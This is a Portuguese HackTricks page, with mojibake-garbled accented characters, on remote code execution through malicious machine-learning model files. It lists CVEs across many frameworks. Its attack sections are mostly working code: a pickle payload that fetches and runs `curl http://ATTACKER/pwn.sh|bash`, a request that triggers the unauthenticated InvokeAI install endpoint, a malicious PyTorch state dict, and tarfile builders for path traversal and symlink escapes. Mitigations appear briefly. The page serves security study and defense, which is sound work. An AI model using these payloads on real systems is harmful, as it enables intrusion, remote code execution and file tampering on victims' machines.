# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Carregando modelos para RCE

Modelos de Machine Learning s√£o geralmente compartilhados em diferentes formatos, como ONNX, TensorFlow, PyTorch, etc. Esses modelos podem ser carregados nas m√°quinas dos desenvolvedores ou em sistemas de produ√ß√£o para serem utilizados. Normalmente, os modelos n√£o devem conter c√≥digo malicioso, mas h√° alguns casos em que o modelo pode ser usado para executar c√≥digo arbitr√°rio no sistema como uma funcionalidade pretendida ou devido a uma vulnerabilidade na biblioteca de carregamento do modelo.

No momento da escrita, estes s√£o alguns exemplos desse tipo de vulnerabilidades:

| **Framework / Ferramenta**  | **Vulnerabilidade (CVE se dispon√≠vel)**                                                                                     | **Vetor RCE**                                                                                                                         | **Refer√™ncias**                               |
|------------------------------|------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Desserializa√ß√£o insegura em* `torch.load` **(CVE-2025-32434)**                                                            | Pickle malicioso no ponto de verifica√ß√£o do modelo leva √† execu√ß√£o de c√≥digo (contornando a prote√ß√£o `weights_only`)                    | |
| PyTorch **TorchServe**      | *ShellTorch* ‚Äì **CVE-2023-43654**, **CVE-2022-1471**                                                                        | SSRF + download de modelo malicioso causa execu√ß√£o de c√≥digo; RCE de desserializa√ß√£o Java na API de gerenciamento                       | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML inseguro) <br> **CVE-2024-3660** (Keras Lambda)                                                   | Carregar modelo de YAML usa `yaml.unsafe_load` (execu√ß√£o de c√≥digo) <br> Carregar modelo com camada **Lambda** executa c√≥digo Python arbitr√°rio | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (an√°lise TFLite)                                                                                         | Modelo `.tflite` malformado aciona estouro de inteiro ‚Üí corrup√ß√£o de heap (potencial RCE)                                             | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                          | Carregar um modelo via `joblib.load` executa pickle com o payload `__reduce__` do atacante                                             | |
| **NumPy** (Python)          | **CVE-2019-6446** (inseguro `np.load`) *disputado*                                                                          | `numpy.load` permitia por padr√£o arrays de objetos pickle ‚Äì `.npy/.npz` malicioso aciona execu√ß√£o de c√≥digo                             | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (traversal de diret√≥rio) <br> **CVE-2024-5187** (traversal tar)                                         | O caminho de pesos externos do modelo ONNX pode escapar do diret√≥rio (ler arquivos arbitr√°rios) <br> Modelo ONNX malicioso tar pode sobrescrever arquivos arbitr√°rios (levando a RCE) | |
| ONNX Runtime (risco de design) | *(Sem CVE)* opera√ß√µes personalizadas ONNX / fluxo de controle                                                              | Modelo com operador personalizado requer carregamento do c√≥digo nativo do atacante; gr√°ficos de modelo complexos abusam da l√≥gica para executar c√°lculos n√£o intencionais | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (traversal de caminho)                                                                                   | Usar a API de carregamento de modelo com `--model-control` habilitado permite traversal de caminho relativo para escrever arquivos (por exemplo, sobrescrever `.bashrc` para RCE) | |
| **GGML (formato GGUF)**     | **CVE-2024-25664 ‚Ä¶ 25668** (m√∫ltiplos estouros de heap)                                                                     | Arquivo de modelo GGUF malformado causa estouros de buffer de heap no parser, permitindo execu√ß√£o de c√≥digo arbitr√°rio no sistema da v√≠tima | |
| **Keras (formatos antigos)** | *(Sem nova CVE)* Modelo Keras H5 legado                                                                                     | Modelo HDF5 (`.h5`) malicioso com c√≥digo de camada Lambda ainda executa ao carregar (modo seguro do Keras n√£o cobre formato antigo ‚Äì ‚Äúataque de downgrade‚Äù) | |
| **Outros** (geral)          | *Falha de design* ‚Äì Serializa√ß√£o Pickle                                                                                     | Muitas ferramentas de ML (por exemplo, formatos de modelo baseados em pickle, `pickle.load` do Python) executar√£o c√≥digo arbitr√°rio embutido em arquivos de modelo, a menos que mitigado | |

Al√©m disso, existem alguns modelos baseados em pickle do Python, como os usados pelo [PyTorch](https://github.com/pytorch/pytorch/security), que podem ser usados para executar c√≥digo arbitr√°rio no sistema se n√£o forem carregados com `weights_only=True`. Portanto, qualquer modelo baseado em pickle pode ser especialmente suscet√≠vel a esse tipo de ataque, mesmo que n√£o esteja listado na tabela acima.

### üÜï  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` √© uma interface web de c√≥digo aberto popular para Stable-Diffusion. As vers√µes **5.3.1 ‚Äì 5.4.2** exp√µem o endpoint REST `/api/v2/models/install` que permite aos usu√°rios baixar e carregar modelos de URLs arbitr√°rias.

Internamente, o endpoint eventualmente chama:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
Quando o arquivo fornecido √© um **PyTorch checkpoint (`*.ckpt`)**, `torch.load` realiza uma **desserializa√ß√£o de pickle**. Como o conte√∫do vem diretamente da URL controlada pelo usu√°rio, um atacante pode incorporar um objeto malicioso com um m√©todo `__reduce__` personalizado dentro do checkpoint; o m√©todo √© executado **durante a desserializa√ß√£o**, levando √† **execu√ß√£o remota de c√≥digo (RCE)** no servidor InvokeAI.

A vulnerabilidade foi atribu√≠da **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Passo a passo da explora√ß√£o

1. Crie um checkpoint malicioso:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. Hospede `payload.ckpt` em um servidor HTTP que voc√™ controla (por exemplo, `http://ATTACKER/payload.ckpt`).
3. Acione o endpoint vulner√°vel (sem autentica√ß√£o necess√°ria):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false ‚Üí no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. Quando o InvokeAI baixa o arquivo, ele chama `torch.load()` ‚Üí o gadget `os.system` √© executado e o atacante ganha execu√ß√£o de c√≥digo no contexto do processo InvokeAI.

Exploit pronto: **M√≥dulo Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatiza todo o fluxo.

#### Condi√ß√µes

‚Ä¢  InvokeAI 5.3.1-5.4.2 (flag de scan padr√£o **false**)
‚Ä¢  `/api/v2/models/install` acess√≠vel pelo atacante
‚Ä¢  O processo tem permiss√µes para executar comandos de shell

#### Mitiga√ß√µes

* Atualize para **InvokeAI ‚â• 5.4.3** ‚Äì o patch define `scan=True` por padr√£o e realiza a verifica√ß√£o de malware antes da desserializa√ß√£o.
* Ao carregar checkpoints programaticamente, use `torch.load(file, weights_only=True)` ou o novo [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.
* Imponha listas de permiss√£o / assinaturas para fontes de modelos e execute o servi√ßo com o menor privil√©gio.

> ‚ö†Ô∏è Lembre-se de que **qualquer** formato baseado em pickle do Python (incluindo muitos arquivos `.pt`, `.pkl`, `.ckpt`, `.pth`) √© inerentemente inseguro para desserializar de fontes n√£o confi√°veis.

---

Exemplo de uma mitiga√ß√£o ad-hoc se voc√™ precisar manter vers√µes mais antigas do InvokeAI em execu√ß√£o atr√°s de um proxy reverso:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
## Exemplo ‚Äì criando um modelo PyTorch malicioso

- Crie o modelo:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Carregue o modelo:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ‚ö†Ô∏è This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
## Modelos para Traversal de Caminho

Como comentado em [**este post do blog**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), a maioria dos formatos de modelos usados por diferentes frameworks de IA √© baseada em arquivos compactados, geralmente `.zip`. Portanto, pode ser poss√≠vel abusar desses formatos para realizar ataques de traversal de caminho, permitindo ler arquivos arbitr√°rios do sistema onde o modelo √© carregado.

Por exemplo, com o seguinte c√≥digo voc√™ pode criar um modelo que criar√° um arquivo no diret√≥rio `/tmp` quando carregado:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
Ou, com o seguinte c√≥digo, voc√™ pode criar um modelo que criar√° um symlink para o diret√≥rio `/tmp` quando carregado:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### Deep-dive: Keras .keras deserialization and gadget hunting

Para um guia focado sobre os internos do .keras, RCE de Lambda-layer, o problema de importa√ß√£o arbitr√°ria em ‚â§ 3.8, e descoberta de gadgets p√≥s-corre√ß√£o dentro da lista de permiss√µes, veja:

{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [OffSec blog ‚Äì "CVE-2024-12029 ‚Äì InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch ‚Äì security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)

{{#include ../banners/hacktricks-training.md}}
